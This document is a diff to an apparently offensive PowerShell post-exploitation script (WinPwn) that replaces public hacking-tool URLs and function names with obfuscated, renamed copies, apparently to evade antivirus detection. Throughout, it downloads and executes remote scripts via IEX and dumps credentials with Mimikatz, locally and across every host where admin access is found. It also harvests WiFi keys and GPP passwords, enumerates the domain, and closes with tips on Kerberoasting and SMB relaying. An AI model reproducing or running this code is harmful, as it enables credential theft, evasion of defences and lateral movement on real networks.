@@ -197,7 +197,7 @@ function sessionGopher {
     #>
     pathcheck
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
-    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/fireeye/SessionGopher/master/SessionGopher.ps1')
+    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/segoph.ps1')
     $whole_domain = Read-Host -Prompt 'Do you want to start SessionGopher search over the whole domain? (yes/no) - takes a lot of time'
     if ($whole_domain -eq "yes" -or $whole_domain -eq "y" -or $whole_domain -eq "Yes" -or $whole_domain -eq "Y")
     {
@@ -205,12 +205,12 @@ function sessionGopher {
             if ($session -eq "yes" -or $session -eq "y" -or $session -eq "Yes" -or $session -eq "Y")
             {
                 Write-Host -ForegroundColor Yellow 'Starting Local SessionGopher, output is generated in '$currentPath'\LocalRecon\SessionGopher.txt:'
-                Invoke-SessionGopher -Thorough -AllDomain >> $currentPath\LocalRecon\SessionGopher.txt -Outfile
+                cachet -hdPXEKUQjxCYg9C -qMELeoMyJPUTJQY >> $currentPath\LocalRecon\SessionGopher.txt -Outfile
             }
             else 
             {
                 Write-Host -ForegroundColor Yellow 'Starting SessionGopher without thorough tests, output is generated in '$currentPath'\LocalRecon\SessionGopher.txt:'
-                Invoke-SessionGopher -AllDomain >> $currentPath\LocalRecon\SessionGopher.txt
+                cachet -qMELeoMyJPUTJQY >> $currentPath\LocalRecon\SessionGopher.txt
             }
     }
     else
@@ -219,12 +219,12 @@ function sessionGopher {
             if ($session -eq "yes" -or $session -eq "y" -or $session -eq "Yes" -or $session -eq "Y")
             {
                 Write-Host -ForegroundColor Yellow 'Starting Local SessionGopher, output is generated in '$currentPath'\LocalRecon\SessionGopher.txt:'
-                Invoke-SessionGopher -Thorough >> $currentPath\LocalRecon\SessionGopher.txt -Outfile
+                cachet -hdPXEKUQjxCYg9C >> $currentPath\LocalRecon\SessionGopher.txt -Outfile
             }
             else 
             {
                 Write-Host -ForegroundColor Yellow 'Starting SessionGopher without thorough tests,output is generated in '$currentPath'\LocalRecon\SessionGopher.txt:'
-                Invoke-SessionGopher >> $currentPath\LocalRecon\SessionGopher.txt
+                cachet >> $currentPath\LocalRecon\SessionGopher.txt
             }
     }
 }
@@ -241,7 +241,7 @@ function Mimikatzlocal {
     pathcheck
     if (isadmin)
     {
-            IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
+            IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/kittie.ps1')
             IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-WLAN-Keys.ps1')
             iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/peewpw/Invoke-WCMDump/master/Invoke-WCMDump.ps1')
 
@@ -252,12 +252,12 @@ function Mimikatzlocal {
             if ($output_file -eq "yes" -or $output_file -eq "y" -or $output_file -eq "Yes" -or $output_file -eq "Y")
             {
                 Write-Host -ForegroundColor Yellow 'Dumping Credentials from Memory and SAM Database, because we can:'
-                Invoke-Mimikatz >> $currentPath\Exploitation\Credentials.txt
+                homegrown >> $currentPath\Exploitation\Credentials.txt
                 Get-WLAN-Keys >> $currentPath\Exploitation\WIFI_Keys.txt
             }
             else
             {
-            Invoke-Mimikatz
+            homegrown
             Get-WLAN-Keys
             }
     }
@@ -284,7 +284,7 @@ function localreconmodules
             pathcheck
             $currentPath = (Get-Item -Path ".\" -Verbose).FullName
             IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Get-ComputerDetails.ps1')
-            IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
+            IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/view.ps1')
 
             Write-Host -ForegroundColor Yellow 'Starting local Recon phase:'
 
@@ -330,7 +330,7 @@ function localreconmodules
                 if ($sharepasshunt -eq "yes" -or $sharepasshunt -eq "y" -or $sharepasshunt -eq "Yes" -or $sharepasshunt -eq "Y")
                 {
                     get-WmiObject -class Win32_Share | ft Path >> passhuntshares.txt
-                    $shares = get-content .\passhuntshares.txt | Select-String -pattern "C:" -notmatch | select-object -skip 3
+                    $shares = get-content .\passhuntshares.txt | select-object -skip 4
                     foreach ($line in $shares)
                     {
                        invoke-expression "cmd /c start powershell -Command {.\passhunt.exe -s $line -o $currentPath}" 
@@ -410,6 +410,7 @@ function localreconmodules
             $search = Read-Host -Prompt 'Do you want to search for sensitive files on this local system? (config files, rdp files, password files and more) (yes/no) - takes a lot of time'
             if ($search -eq "yes" -or $search -eq "y" -or $search -eq "Yes" -or $search -eq "Y")
             {
+                IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/find-interesting.ps1')
                 Write-Host -ForegroundColor Yellow 'Looking for interesting files:'
                 Find-InterestingFile -Path 'C:\' -Outfile "$currentPath\LocalRecon\InterestingFiles.txt"
                 Find-InterestingFile -Path 'C:\' -Terms pass,login,rdp,kdbx,backup -Outfile "$currentPath\LocalRecon\MoreFiles.txt"
@@ -443,7 +444,7 @@ function jaws
             pathcheck
             $currentPath = (Get-Item -Path ".\" -Verbose).FullName
             Write-Host -ForegroundColor Yellow 'Executing Just Another Windows (Enum) Script:'
-            Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1' -Outfile $currentPath\LocalPrivesc\JAWS.ps1
+            Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SecureThisShit/Creds/master/jaws-enum.ps1' -Outfile $currentPath\LocalPrivesc\JAWS.ps1
             Invoke-expression 'cmd /c start powershell -Command {powershell.exe -ExecutionPolicy Bypass -File .\LocalPrivesc\JAWS.ps1 -OutputFilename JAWS-Enum.txt}'
 
 }
@@ -460,7 +461,7 @@ function domainreconmodules
             $currentPath = (Get-Item -Path ".\" -Verbose).FullName
             pathcheck
             IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1')
-            IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
+            IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/view.ps1')
             $domain_Name = Get-NetDomain
             $Domain = $domain_Name.Name
 
@@ -470,60 +471,67 @@ function domainreconmodules
             Get-DomainUserList -Domain $domain_Name.Name -RemoveDisabled -RemovePotentialLockouts | Out-File -Encoding ascii $currentPath\DomainRecon\userlist.txt
             
             Write-Host -ForegroundColor Yellow 'Searching for Exploitable Systems:'
-            Get-ExploitableSystem >> $currentPath\DomainRecon\ExploitableSystems.txt
+            inset >> $currentPath\DomainRecon\ExploitableSystems.txt
 
             ## TODO Invoke-WebRequest -Uri 'https://github.com/NetSPI/goddi/releases/download/v1.1/goddi-windows-amd64.exe' -Outfile $currentPath\Recon.exe
             ## TODO https://github.com/canix1/ADACLScanner 
 
             #Powerview
             Write-Host -ForegroundColor Yellow 'All those PowerView Network Skripts for later Lookup getting executed and saved:'
-            Get-NetDomain >> $currentPath\DomainRecon\NetDomain.txt
-            Get-NetForest >> $currentPath\DomainRecon\NetForest.txt
-            Get-NetForestDomain >> $currentPath\DomainRecon\NetForestDomain.txt      
-            Get-NetDomainController >> $currentPath\DomainRecon\NetDomainController.txt  
-            Get-NetUser >> $currentPath\DomainRecon\NetUser    
-            Get-NetComputer >> $currentPath\DomainRecon\NetSystems.txt   
+            skulked >> $currentPath\DomainRecon\NetDomain.txt
+            televisions >> $currentPath\DomainRecon\NetForest.txt
+            misdirects >> $currentPath\DomainRecon\NetForestDomain.txt      
+            odometer >> $currentPath\DomainRecon\NetDomainController.txt  
+            Houyhnhnm >> $currentPath\DomainRecon\NetUser    
+            Randal >> $currentPath\DomainRecon\NetSystems.txt   
             Get-Printer >> $currentPath\DomainRecon\NetPrinter.txt
-            Get-NetOU >> $currentPath\DomainRecon\NetOU.txt    
-            Get-NetSite >> $currentPath\DomainRecon\NetSite.txt  
-            Get-NetSubnet >> $currentPath\DomainRecon\NetSubnet.txt
-            Get-NetGroup >> $currentPath\DomainRecon\NetGroup.txt 
-            Get-NetGroupMember >> $currentPath\DomainRecon\NetGroupMember.txt   
-            Get-NetFileServer >> $currentPath\DomainRecon\NetFileServer.txt 
-            Get-DFSshare >> $currentPath\DomainRecon\DFSshare.txt 
-            Get-NetShare >> $currentPath\DomainRecon\NetShare.txt 
-            Get-NetLoggedon >> $currentPath\DomainRecon\NetLoggedon
-            Get-NetDomainTrust >> $currentPath\DomainRecon\Domaintrusts.txt
-            Get-NetForestTrust >> $currentPath\DomainRecon\ForestTrust.txt
-            Find-ForeignUser >> $currentPath\DomainRecon\ForeignUser.txt
-            Find-ForeignGroup >> $currentPath\DomainRecon\ForeignGroup.txt
+            damsels >> $currentPath\DomainRecon\NetOU.txt    
+            xylophone >> $currentPath\DomainRecon\NetSite.txt  
+            ignominies >> $currentPath\DomainRecon\NetSubnet.txt
+            reapportioned >> $currentPath\DomainRecon\NetGroup.txt 
+            confessedly >> $currentPath\DomainRecon\NetGroupMember.txt   
+            aqueduct >> $currentPath\DomainRecon\NetFileServer.txt 
+            marinated >> $currentPath\DomainRecon\DFSshare.txt 
+            merchandising >> $currentPath\DomainRecon\DFSsharev1.txt
+            visible >> $currentPath\DomainRecon\DFSsharev2.txt
+            liberation >> $currentPath\DomainRecon\NetShare.txt 
+            cherubs >> $currentPath\DomainRecon\NetLoggedon
+            Trojans >> $currentPath\DomainRecon\Domaintrusts.txt
+            sequined >> $currentPath\DomainRecon\ForestTrust.txt
+            ringer >> $currentPath\DomainRecon\ForeignUser.txt
+            condor >> $currentPath\DomainRecon\ForeignGroup.txt
 	    
-	    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1')
+	    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/viewdev.ps1')
 	    $Date = (Get-Date).AddYears(-1).ToFileTime()
-            Get-DomainUser -LDAPFilter "(pwdlastset<=$Date)" -Properties samaccountname,pwdlastset >> $currentPath\DomainRecon\Users_Nochangedpassword.txt
+            noshes -RmrzVOkRggEzAyC "(pwdlastset<=$Date)" -wDpWXLYTGZrAWN9 samaccountname,pwdlastset >> $currentPath\DomainRecon\Users_Nochangedpassword.txt
 	    
-	    Get-DomainUser -LDAPFilter "(!userAccountControl:1.2.840.113556.1.4.803:=2)" -Properties distinguishedname
-            Get-DomainUser -UACFilter NOT_ACCOUNTDISABLE -Properties distinguishedname >> $currentPath\DomainRecon\Enabled_Users.txt
+	    noshes -RmrzVOkRggEzAyC "(!userAccountControl:1.2.840.113556.1.4.803:=2)" -wDpWXLYTGZrAWN9 distinguishedname
+            noshes -UACFilter NOT_ACCOUNTDISABLE -wDpWXLYTGZrAWN9 distinguishedname >> $currentPath\DomainRecon\Enabled_Users.txt
 	    
-	    $Computers = Get-DomainComputer -Unconstrained >> $currentPath\DomainRecon\Unconstrained_Systems.txt
-            $Users = Get-DomainUser -AllowDelegation -AdminCount >> $currentPath\DomainRecon\UnconstrainedDelegationUsers.txt
+	    $Computers = eigenvalues -Ku9ZmWgd9fLSPTw >> $currentPath\DomainRecon\Unconstrained_Systems.txt
+            $Users = noshes -ppACfvFXyx9fpzx -SkNLjyYBJxqKTQ9 >> $currentPath\DomainRecon\UnconstrainedDelegationUsers.txt
 	    
-	    $DomainPolicy = Get-DomainPolicy -Policy Domain
+	    $DomainPolicy = ablaze -Tj9sqOWMRhlsjX9 Domain
             $DomainPolicy.KerberosPolicy >> $currentPath\DomainRecon\Kerberospolicy.txt
             $DomainPolicy.SystemAccess >> $currentPath\DomainRecon\Passwordpolicy.txt
 	    
-	    Get-DomainGPOUserLocalGroupMapping -Identity $env:UserName -LocalGroup RDP >> $currentPath\DomainRecon\RDPAccess_Systems.txt 
+	    bustling -WPxsp9KIBMFyVPQ -n9gorCgPlTjDyXn RDP >> $currentPath\DomainRecon\RDPAccess_Systems.txt 
 	    
 	    $session = Read-Host -Prompt 'Do you want to search for potential sensitive domain shares - can take a while? (yes/no)'
             if ($session -eq "yes" -or $session -eq "y" -or $session -eq "Yes" -or $session -eq "Y")
             {
-	    	Find-InterestingDomainShareFile >> $currentPath\DomainRecon\InterestingDomainshares.txt
+	    	replaced >> $currentPath\DomainRecon\InterestingDomainshares.txt
 	    }
-            Write-Host -ForegroundColor Yellow 'Starting ACLAnalysis for Shadow Admin detection:'
-            invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/SecureThisShit/ACLight/master/ACLight2/ACLight2.ps1'');Start-ACLsAnalysis;Write-Host -ForegroundColor Yellow ''Moving Files:'';mv C:\Results\ .\DomainRecon\;}'
+            $aclight = Read-Host -Prompt 'Starting ACLAnalysis for Shadow Admin detection? (yes/no)'
+            if ($aclight -eq "yes" -or $aclight -eq "y" -or $aclight -eq "Yes" -or $aclight -eq "Y")
+            {
+	    	    Write-Host -ForegroundColor Yellow 'Starting ACLAnalysis for Shadow Admin detection:'
+                invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/SecureThisShit/ACLight/master/ACLight2/ACLight2.ps1'');Start-ACLsAnalysis;Write-Host -ForegroundColor Yellow ''Moving Files:'';mv C:\Results\ .\DomainRecon\;}'
 
+	        }
+            
             Write-Host -ForegroundColor Yellow 'Downloading ADRecon Script:'
-            Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/sense-of-security/ADRecon/master/ADRecon.ps1' -Outfile $currentPath\DomainRecon\ADrecon\recon.ps1
+            Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SecureThisShit/Creds/master/ADRecon.ps1' -Outfile $currentPath\DomainRecon\ADrecon\recon.ps1
             Write-Host -ForegroundColor Yellow 'Executing ADRecon Script:'
             invoke-expression 'cmd /c start powershell -Command {.\DomainRecon\ADrecon\recon.ps1}'
 }
@@ -542,7 +550,7 @@ function sharphound
     $Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     pathcheck
-    Invoke-WebRequest -Uri 'https://github.com/BloodHoundAD/BloodHound/raw/master/Ingestors/SharpHound.exe' -Outfile $currentPath\Domainrecon\Sharphound.exe
+    Invoke-WebRequest -Uri 'https://github.com/BloodHoundAD/BloodHound/raw/master/Ingestors/SharpHound.exe' -Outfile "$currentPath\Domainrecon\Sharphound.exe"
     
     Write-Host -ForegroundColor Yellow 'Running Sharphound Collector: '
     .\DomainRecon\Sharphound.exe -c All
@@ -560,8 +568,8 @@ function privescmodules
     #Privilege Escalation Phase
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     pathcheck
-    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1')
-    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')
+    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/locksher.ps1')
+    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/UpPower.ps1')
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1')
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPAutologon.ps1')
     iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/peewpw/Invoke-WCMDump/master/Invoke-WCMDump.ps1')
@@ -576,10 +584,10 @@ function privescmodules
     Get-GPPPassword >> $currentPath\LocalPrivesc\GPP_Passwords.txt
 
     Write-Host -ForegroundColor Yellow 'Looking for Local Privilege Escalation possibilities:'
-    Invoke-Allchecks >> $currentPath\LocalPrivesc\All_Localchecks.txt
+    families >> $currentPath\LocalPrivesc\All_Localchecks.txt
 
     Write-Host -ForegroundColor Yellow 'Looking for MS-Exploits on this local system for Privesc:'
-    Find-AllVulns >> $currentPath\LocalPrivesc\Sherlock_Vulns.txt
+    proportioned >> $currentPath\LocalPrivesc\Sherlock_Vulns.txt
 
     $search = Read-Host -Prompt 'Start Just Another Windows (Enum) Script? (yes/no)'
     if ($search -eq "yes" -or $search -eq "y" -or $search -eq "Yes" -or $search -eq "Y")
@@ -624,9 +632,9 @@ function latmov
     pathcheck
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/ChrisTruncer/WMIOps/master/WMIOps.ps1')
-    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PewPewPew/Invoke-MassMimikatz.ps1')
+    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/masskittie.ps1')
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1')
-    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
+    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/view.ps1')
     $domain_Name = Get-NetDomain
     $Domain = $domain_Name.Name
     
@@ -634,7 +642,7 @@ function latmov
 
     Write-Host -ForegroundColor Yellow 'Searching for Domain Systems we can pwn with admin rights, this can take a while depending on the size of your domain:'
 
-    Find-LocalAdminAccess >> $currentPath\Exploitation\LocalAdminAccess.txt
+    fuller >> $currentPath\Exploitation\LocalAdminAccess.txt
 
     $exploitdecision = Read-Host -Prompt 'Do you want to Dump Credentials on all found Systems or Execute Empire Stager? (dump/empire)'
     if ($exploitdecision -eq "dump" -or $exploitdecision -eq "mimikatz" -or $exploitdecision -eq "Credentials")
@@ -645,7 +653,7 @@ function latmov
         {
            if (Test-Path $currentPath\Exploitation\LocalAdminAccess.txt)
            {
-               Invoke-MassMimikatz -Hostlist $currentPath\Exploitation\LocalAdminAccess.txt >> $currentPath\Exploitation\PwnedSystems_Credentials.txt
+               bookmobile -sILeZZaOSNUwrt9 $currentPath\Exploitation\LocalAdminAccess.txt >> $currentPath\Exploitation\PwnedSystems_Credentials.txt
            }
            else { Write-Host -ForegroundColor Red 'No Systems with admin-Privileges found in this domain' }
         }
@@ -737,10 +745,10 @@ function shareenumeration
     #Enumeration Phase
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     pathcheck
-    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
+    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/view.ps1')
     Write-Host -ForegroundColor Yellow 'Searching for sensitive Files on the Domain-Network, this can take a while:'
-    Invoke-FileFinder >> $currentPath\SensitiveFiles.txt
-    Invoke-ShareFinder -ExcludeStandard >> $currentPath\Networkshares.txt
+    Claire >> $currentPath\SensitiveFiles.txt
+    shift -ExcludeStandard >> $currentPath\Networkshares.txt
 }
 
 function groupsearch
@@ -754,20 +762,21 @@ function groupsearch
     #Enumeration Phase
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     pathcheck
-    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1')
+    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/viewdev.ps1')
     $user = Read-Host -Prompt 'Do you want to search for other users than the session-user? (yes/no)'
             if ($user -eq "yes" -or $user -eq "y" -or $user -eq "Yes" -or $user -eq "Y")
             {
-                $username = Read-Host -Prompt 'Please enter a username to search for: (without domain-name)'
+                Write-Host -ForegroundColor Yellow "Please enter a username to search for:"
+                $username = Get-Credential
                 $group = Read-Host -Prompt 'Please enter a Group-Name to search for: (Administrators,RDP)'
                 Write-Host -ForegroundColor Yellow 'Searching...:'
-                Get-DomainGPOUserLocalGroupMapping -LocalGroup $group -UserName $username >> $currentPath\Groupsearches.txt
+                bustling -n9gorCgPlTjDyXn $group -szvFVWkPJummdcf $username >> $currentPath\Groupsearches.txt
             }
             else
             {
                 $group = Read-Host -Prompt 'Please enter a Group-Name to search for: (Administrators,RDP)'
                 Write-Host -ForegroundColor Yellow 'Searching...:'
-                Get-DomainGPOUserLocalGroupMapping -LocalGroup $group -UserName $env:UserName >> $currentPath\Groupsearches.txt
+                bustling -n9gorCgPlTjDyXn $group -WPxsp9KIBMFyVPQ >> $currentPath\Groupsearches.txt
                 Write-Host -ForegroundColor Yellow "Systems saved to >> $currentPath\Groupsearches.txt:"
             }
 }
@@ -946,6 +955,6 @@ function WinPwn
     }
     
     #End
-    Write-Host -ForegroundColor Yellow 'Didnt get Domadm? Check the found Files/Shares for sensitive Data/Credentials. Also try Responder/Inveigh and SMB-Relaying!'
+    Write-Host -ForegroundColor Yellow 'Didnt get Domadm? Check the found Files/Shares for sensitive Data/Credentials. Check the Property field of AD-Users for Passwords. Network Shares and Passwords in them can lead to success! Try Responder/Inveigh and SMB-Relaying! ADIDNS is a good addition for the whole network. Crack Kerberoasting Hashes.'
     
 }
